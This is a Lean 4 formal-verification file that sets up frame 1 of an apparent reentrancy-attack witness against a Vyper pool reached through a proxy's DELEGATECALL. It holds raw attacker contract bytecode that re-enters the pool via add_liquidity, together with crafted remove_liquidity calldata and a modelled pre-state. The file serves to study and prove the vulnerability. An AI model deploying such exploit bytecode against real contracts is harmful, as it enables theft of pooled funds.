import Blanc.Lift.VyperNonreentrantDeployed.Vulnerable.Cert
import Blanc.Lift.VyperNonreentrantDeployed.ProxyEntry
import Blanc.Lift.Witness

/-!
V- witness prototype, frame 1: the implementation's `remove_liquidity(200, [0, 0], A)`
under `DELEGATECALL` from the pool proxy `P` (storage owner `P`), Prague, run by the
certificate interpreter `Blanc.Lift.Witness.wrun` over the registered 0x6326
certificate.  Pre-state: the vminus-preflight table (Plans
`reports/vminus-preflight-v1.md` section 2).
-/

namespace Blanc.Lift.VyperNonreentrantDeployed.Vulnerable.Frame1

open Jaune Blanc.Lift Blanc.Lift.Witness
open Blanc.Lift.VyperNonreentrantDeployed

/-- The attacker `A`. -/
def attackerAddress : Adr := 0xaaaa000000000000000000000000000000000a11
/-- The honest token `T` (coin 1). -/
def tokenAddress : Adr := 0xbbbb000000000000000000000000000000000b0b

/-- A big-endian 32-byte ABI word. -/
def word (n : Nat) : Bytes :=
  (List.range 32).reverse.map fun i => ((n >>> (8 * i)) % 256).toUInt8

/-- `remove_liquidity(uint256,uint256[2],address)` = `0x3eb1719f`, `(200, [0, 0], A)`. -/
def removeCalldata : Bytes :=
  [0x3e, 0xb1, 0x71, 0x9f] ++ word 200 ++ word 0 ++ word 0 ++ word attackerAddress.toNat

/-- `balanceOf[A]`'s slot: `keccak256(bytes32(24) ++ bytes32(A))`. -/
def balanceOfASlot : Nat := 0xe4f8d74102992de968bca999dbf99b39c489f7ea70744cdc933f25805a05f32d

/-- The pool's nonzero storage at `P` (vminus-preflight section 2; the locks at slots 0
and 2, `fee` (10) and `future_A_time` (14) are zero, i.e. absent). -/
def poolStorage : List (Nat × Nat) :=
  [(7, tokenAddress.toNat), (8, 1000), (9, 1000), (12, 10000),
   (15, 10 ^ 18), (16, 10 ^ 18), (26, 2000), (balanceOfASlot, 2000)]

/-- The attacker's runtime (85 bytes, vminus-preflight `meta.json`): builds
`add_liquidity([100, 0], 0, A)` calldata and `CALL`s `P` with all gas and value 100. -/
def attackerCode : ByteArray := ⟨#[
  0x63, 0x0c, 0x3e, 0x4b, 0x54, 0x60, 0xe0, 0x1b, 0x60, 0x00, 0x52, 0x60, 0x64, 0x60, 0x04, 0x52,
  0x60, 0x00, 0x60, 0x24, 0x52, 0x60, 0x00, 0x60, 0x44, 0x52, 0x73, 0xaa, 0xaa, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x11, 0x60,
  0x64, 0x52, 0x60, 0x00, 0x60, 0x00, 0x60, 0x84, 0x60, 0x00, 0x60, 0x64, 0x73, 0x98, 0x48, 0x48,
  0x2d, 0xa3, 0xee, 0x30, 0x76, 0x16, 0x5c, 0xe6, 0x49, 0x7e, 0xda, 0x90, 0x6e, 0x66, 0xbb, 0x85,
  0xc5, 0x5a, 0xf1, 0x50, 0x00]⟩

/-- The honest token's runtime (30 bytes, vminus-preflight `meta.json`): `transfer`
with `balanceOf[addr]` at slot `addr`, returning 32-byte `true`. -/
def tokenCode : ByteArray := ⟨#[
  0x33, 0x54, 0x60, 0x24, 0x35, 0x90, 0x03, 0x33, 0x55, 0x60, 0x04, 0x35, 0x80, 0x54, 0x60, 0x24,
  0x35, 0x01, 0x90, 0x55, 0x60, 0x01, 0x60, 0x00, 0x52, 0x60, 0x20, 0x60, 0x00, 0xf3]⟩

/-- The pre-state's accounts without storage (vminus-preflight section 2): the proxy
`P` with 1000 wei, the implementation, the attacker and the token, all nonce 1.  The
implementation's code is the registered certificate's `code` (the same 17,535 bytes as
`implementationCode`, SHA-256 082cdf7d...), so the frames it runs in need no bridge. -/
def accts0 : List (Adr × Acct) :=
  [(proxyAddress, ⟨1, (1000 : Nat).toB256, .empty, proxyCode⟩),
   (implementationAddress, ⟨1, 0, .empty, code⟩),
   (attackerAddress, ⟨1, 0, .empty, attackerCode⟩),
   (tokenAddress, ⟨1, 0, .empty, tokenCode⟩)]

/-- The storage-free world. -/
def world0_base : State := stateFoldAcct default accts0

theorem storOf_world0_base (a : Adr) (k : B256) : storOf world0_base a k = 0 :=
  storOf_stateFoldAcct accts0 a k

/-- The account shadow of the pre-state. -/
def acs0 : AcctShadow := acctShadowOf accts0

theorem acctAgree_world0_base : AcctAgree world0_base acs0 := acctAgree_stateFoldAcct accts0

/-- Concrete storage writes of the pre-state: the pool's at `P`, and the token's
`balanceOf[P] = 1000` at slot `P`. -/
def poolWrites1 : List ((Adr × B256) × B256) :=
  poolStorage.map (fun (k, v) => ((proxyAddress, k.toB256), v.toB256)) ++
    [((tokenAddress, proxyAddress.toNat.toB256), (1000 : Nat).toB256)]

/-- The world, built by folding `poolWrites1` from the storage-free base world. -/
def world0 : State := stateFoldStor world0_base poolWrites1

/-- The pool account `P`: the 45-byte proxy, 1000 wei, the pool storage. -/
def poolAcct : Acct :=
  { nonce := 1, bal := (1000 : Nat).toB256, code := proxyCode,
    stor := poolStorage.foldl (fun s kv => Std.TreeMap.insert s kv.1.toB256 kv.2.toB256) .empty }

def gas1 : Nat := 29528638

def sevm1 : Sevm :=
  { (default : Sevm) with
    caller := attackerAddress
    target := some proxyAddress
    currentTarget := proxyAddress
    gas := gas1
    value := 0
    data := removeCalldata
    codeAddress := some implementationAddress
    code := code
    depth := 1023
    benvStat := { (default : BenvStat) with origState := world0 } }

/-- Frame 1's entry machine: the proxy's `DELEGATECALL` has warmed the implementation
address (the top-level message starts with empty accessed sets, as in the preflight). -/
def pre1 : Devm :=
  addAccessedAddress (((default : Devm).withGasLeft gas1).withState world0) implementationAddress

def stor1 : StorShadow := storShadowOf poolWrites1

def c0 : Cfg := ⟨pre1, t_0000_c0, [], [], [implementationAddress], stor1, acs0⟩

theorem c0_agree : Agree c0 := by
  refine ⟨fun x => ?_, fun a => ?_, ?_, ?_⟩
  · show x ∈ (default : Devm).accessedStorageKeys ↔ x ∈ ([] : List (Adr × B256))
    simp only [show (default : Devm).accessedStorageKeys = .emptyWithCapacity from rfl,
      Std.HashSet.not_mem_emptyWithCapacity, List.not_mem_nil]
  · show a ∈ (default : Devm).accessedAddresses.insert implementationAddress ↔
      a ∈ [implementationAddress]
    rw [Std.HashSet.mem_insert, List.mem_singleton, beq_iff_eq,
      show (default : Devm).accessedAddresses = .emptyWithCapacity from rfl]
    simp only [Std.HashSet.not_mem_emptyWithCapacity, or_false]
    exact ⟨Eq.symm, Eq.symm⟩
  · show ∀ a k, storOf world0 a k = lookupS stor1 a k
    exact storOf_stateFoldStor poolWrites1 storOf_world0_base
  · show AcctAgree world0 acs0
    exact acctAgree_stateFoldStor poolWrites1 acctAgree_world0_base


/-- The observed projection a chunk decision pins: gas, stack and memory bytes. -/
def summ : Res → Option (Nat × List Nat × List Nat)
  | .cont c => some (c.devm.gasLeft, c.devm.stack.map B256.toNat,
      c.devm.memory.data.toList.map UInt8.toNat)
  | _ => none

end Blanc.Lift.VyperNonreentrantDeployed.Vulnerable.Frame1
